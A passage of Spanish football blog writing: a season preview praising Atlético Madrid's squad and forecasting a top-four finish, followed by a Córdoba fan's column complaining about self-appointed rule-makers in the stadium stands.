al equipo hundido en la liga y fuera de la Champions en un grupo asequible. Cuando Quique llegó encontró al club en la depresión de casi siempre. La metáfora del enfermo era muy acertada.Y de la nada, el Atleti se plantó en dos finales. La primera la ganó frente al Fulham, alzando la novísima Europa League. Perdió la segunda y la Copa del Rey voló a las vitrinas del Sánchez Pizjuan. Aún con ese postrero revés, el equipo ilusionó a todos. A favor tenemos un equipo aseado, estrellas de ámbito mundial, un entrenador con las ideas claras, una cantera que escupe futbolistas de calidad, un título después de muchos años y, sobre todo, la sensación de que las penurias van a acabar de repente. Como si la pasada campaña hubiera traído un nuevo carácter, como si se hubieran derrotado esos apodos perjudiciales y condescendientes. A unos días de empezar la liga esa sensación pervive en el ambiente.Los fichajes, metadona para los aficionados en el largo y soporífero verano, han sido colosales. A expensas del rendimiento, una incógnita siempre, los nombres relucen en la tabla de incorporaciones. Filipe Luis, el mejor lateral zurdo de los últimos años en nuestra liga, con el que han coqueteado muchos grandes equipos, acepta jugar en el Atleti. La baja de un Pernía testimonial y la dosificación de un racial pero intermitente Antonio López pedían un recambio, y llegó uno de lujo. Godín, central uruguayo del Villareal, experimentado y seguro, también decide venir al Manzanares. De un plumazo, y sobre la mesa, solventado el problema de la defensa. Con Ufjalusi escorado al lateral, con Perea más entonado que de costumbre y, sobre todo, con la irrupción de Domínguez, el equipo de Quique Sánchez Flores ha confeccionado una zaga notable.El centro del campo también ha mejorado sensiblemente.Ha repescado a Mario Suárez, que viene de jugar regularmente en el Mallorca. Ha apostado por Fran Mérida, un centrocampista creativo con más capacidad asociativa que Raúl García y más desgaste que Jurado; y ha firmado una nueva cesión de Tiago, el encargado de dar consistencia a la medular la temporada pasada. Visto así, y sumando el renacer de Reyes, la solvencia habitual de Simao y el oficio y trabajo de Assunçao, el equipo colchonero puede presumir de un centrocampo fluido, poblado y resultón.La delantera es el cofre donde el club guarda sus tesoros. Forlán y Agüero son un dúo desequilibrante, goleador, talentoso, de equipo que aspira a todo. En el banco, y tras las salida de Salvio al Benfica, Diego Costa ha conseguido convencer al técnico. Lo hizo bien en el Valladolid y en su rol en la plantilla –alternativa del uruguayo y el argentino- da más seguridad que Ibrahima y está un paso por encima de otros jugadores que en el pasado ocuparon su posición como Sinama-Pongolle. Las tres líneas, unidas al magnífico rendimiento del portero De Gea –tanto futuro como presente viendo su desempeño bajo palos en los últimos meses- convierten al Atleti en, cuanto menos, un equipo compensado y sólida alternativa a los de siempre.De la paciencia del Calderón, ganada gramo a gramo por Quique, y el rendimiento de las incorporaciones depende el devenir de una entidad que ya no victimiza su situación, sino que aspira a todo. Sin pudor, sin temor a los fantasmas. La planificación de este año ha sido excelente, el trabajo de la cantera también. Aquella copa levantada de la Europa League disipó muchas dudas, fue un empujón para un club anclado en la desdicha, en la alegría con cuentagotas. No sé como saldrán las cosas, pero como estructura, como plantilla, basándonos en el simple y llano fútbol, el Atlético debe ser carne de Champions para la próxima temporada. Enlazar unas cuantas temporadas meritorias puede servir, de una vez por todas, para olvidar la molesta estampa de los últimos años de club poco congraciado con el éxito.Lo mejor: Su delantera es apabullante. Capaz de llevar al equipo muy lejos a poco que el resto de la maquinaria funcione dignamente.Lo peor: El Atleti es un club imprevisible. En sus genes, o donde sea, siempre guarda esa capacidad de defraudar aún cuando las cosas se hayan hecho bien.Pronóstico: Creo que el equipo está preparado para acabar entre los cuatro primeros. El Valencia es un incógnita y el Sevilla anda desnortado. Puede ser el tercer equipo tras los dos indiscutibles de siempre. Los estadios son sitios pequeños con sus manías, sus rituales y sus impostores. Pequeñas sociedades con dioses efímeros, leyes más efímeras todavía y liderazgos volátiles en la grada. Marvin Harris no hubiera necesitado salir de su Brooklyn natal si se hubiera aficionado a ir al fútbol cada dos semanas. Todo está en las gradas. El poder, la concupiscencia y el engaño. Los abusos, el ostracismo y la estupidez.Criticaba un amigo airadamente, en su asiento de gol norte, el lastimoso juego del Córdoba cuando alguien le recriminó, con un tono conciliador que no escondía su invasivos argumentos, que el Córdoba iba tercero y que le diera tiempo y que peor estábamos hace un año y que al estadio se iba a animar y no a criticar a los suyos.Anuncié en Twitter que iba al estadio una tarde y que ya había comprado mi paquete gigante de pipas Arias Lizano cuando alguien me escribió diciéndome que al Arcángel se iba a animar y no a comer pipas y que los aficionados de verdad no comían pipas.Fue mi hermana una tarde conmigo al estadio y balbuceó el himno, porque no se lo sabe todavía, mientras que todo el Arcángel cantaba a capela eso de “Infinita pasión por mis colores…” cuando le dio por aplaudir en el estribillo final de la canción. Notó como desconocidos cercanos le silbaban y abucheaban porque, por lo visto, no se puede aplaudir rítmicamente el himno por un motivo que aún nadie ha sabido explicarme.Con tal profusión de normas me hicieron sentir un extraño en el estadio que siento como mi casa. Tengo un carnet de abonado, como todos aquellos que legislan la vida en las gradas.También me tomo mi tiempo en acudir al estadio. Me gasto mi dinero para llegar hasta allí desde Málaga, donde vivía, o Sevilla, donde ahora vivo. También sufro, peno y trago pelo en la garganta si marcan en contra. Y grito y abrazo al que tenga al lado si marcamos.Soy de la cofradía de hacer lo que me de la gana en cada momento, siempre y cuando no fastidie al prójimo. Será la educación católica que recibí hasta que me apunté a eso de la Ética en el colegio. Que viene a ser lo mismo: una moral del individuo en un entorno agresivo. El difícil encaje de las piezas. Sentir la vida como una carrera de obstáculos que hay que ganar sin perder la sonrisa. Me esfuerzo en que cada palabra que diga esté medida y que cada cosa que haga contemple las consecuencias. Si hago daño es porque quiero hacerlo. Y si no quería hacerlo, me disculpo e intento reparar la ofensa. Me muevo entre la gente como un esquiador alpino en descenso irrefrenable.Voy al fútbol como quien va a una fiesta a la que no ha sido invitado. A beber y pasarlo bien sin necesidad de conocer a nadie. Si hago amigos, los abrazo. Si no me hablo con nadie, no me enfado. Soy lo que puedo llegar a ser en mi asiento, con mis pipas y el insulto fácil que se me cae de la boca en los partidos como a un bebé las babas en el hombro de su padre.No entiendo a todos esos que quieren controlar la pasión de los demás. Domesticarla. Llevarla a su terreno. Coreografiarla para decir: yo fui coreógrafo de ese baile. Yo fui. Yo soy. Yo. Yo. Y muchas veces yo. Porque hay en la legislación espontáneo un profundo sentimiento narcisista, de creer que somos por encima de los demás. Porque yo veo el fútbol así, así es como se tiene que ver el fútbol.Cuando mi amigo insultó a Víctor Pérez sabía perfectamente que hace un puñado de años estábamos en Segunda B. Lo sabía porque él estaba allí con su hermana y su primo haciéndose kilómetros en un autobús arrastrando su deseo de victoria por campos municipales de Jaen, Murcia o Almería. Y si como pipas es porque me calman los nervios. Los nervios por ver jugar a mi equipo. Y si mi hermana Mari Carmen aplaude el himno lo hace porque quiere sumarse a una fiesta que hasta hace un año no conocía y que ahora le anima los fines de semana y aplaude porque es feliz de estar allí, en un estadio, con más gente, apoyando a un club que ha empezado a sentir como suyo.Estoy cansado de todos esos jefes tribales que abundan en los estadios. No solo en el Arcángel. También en el Tartiere, o en Castalia, en el Sánchez-Pizjuán o en San Mamés. La vida no puede ser oponerse a la vida de los demás. La invasión del tiempo y el espacio ajeno para reforzarse a sí mismo. Desunir en vez de unir. Romper en vez de arreglar. El ego por encima del nosotros.Ya no son solo los titiriteros. Es el perro Excalibur, los Reyes Magos, la foto de Aylan, Pedrerol, los trajes de Pablo Iglesias, las palabras de Piqué, John Cobra en Eurovisión, Babunski, los silbidos al himno, los que ven Gran Hermano, los que no lo hacen, los que llaman muffins a las magdalenas, las barbas, los shorts, las mierdas que a diario se comparten en Facebook, los veganos, los carnívoros, los ateos, los cofrades. Vivimos en la época de la invasión del otro, de la moralidad cercenadora, de la imposición, de las normas blandas. De las afrentas.Del “eso que dices me ofende”. Del “usas un tono agresivo”. Del “mientras tú hablas de fútbol están muriendo niños”. Somos pequeñas aldeas ajenas al progreso. Los estadios, con sus tótems, sus jefecillos, sus palmeros. Rituales de la nada. Pasión excluyente por mis colores. Qué cansancio la existencia. Qué difícil desconectar del mundo. Salvo en el gol. El gol que nos consuela, el gol que tapona la herida.Y después vuelta a la realidad. A la insoportable convivencia en la bancada local. Intentando hacer lo que uno quiere sin que nadie venga a decirle lo que debe hacer. Los listos. Los listos me convierten la sangre en asadura. Los que siempre saben todo. Los que eligen. Los que quieren mandar. Los listos me hacen ser bárbaro. Me obligan a calzarme las pieles y las hachas. Si esos son los listos, yo prefiero ser de los demás, de los que no saben, los de la anarquía y el culto al sol. Los otros.Los estadios: repúblicas bananeras del ánimo. Cunas del odio y el amor. Amargo y dulce como un yogur caducado. Frio y caliente como un potingue de Durex. Enormes y pequeños. Atestados y solitarios. El fútbol es la celebración del individuo, somos los bárbaros.